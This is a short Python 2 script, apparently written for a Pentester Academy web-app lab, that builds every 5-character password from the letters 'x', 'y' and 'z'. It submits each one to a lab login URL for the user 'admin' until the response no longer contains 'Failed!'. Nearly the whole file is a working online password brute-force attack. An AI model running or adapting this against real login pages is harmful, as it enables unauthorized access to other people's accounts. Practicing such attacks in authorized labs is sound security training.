
import itertools
import urllib
 
def generate_wordlist(words,l):
    list_pass = [] 
    for i in itertools.product(words,repeat=l): 
        list_pass.append("".join(i))     #Generating the list
    return list_pass;
 
list_pass = generate_wordlist('xyz',5)
 
def brute_force(username):
    
    passwords = generate_wordlist('xyz',5);
    url = "http://www.pentesteracademylab.appspot.com/lab/webapp/1?email="+username+"@pentesteracademy.com&password="   #url structure
    for i in passwords:
        response = urllib.urlopen(url+i).read()
        if not "Failed!" in response:
            print "username: ", username, "n Password : ", i;
            break;
 
        else:
            print "Passwords are failing !!"
 
brute_force("admin")
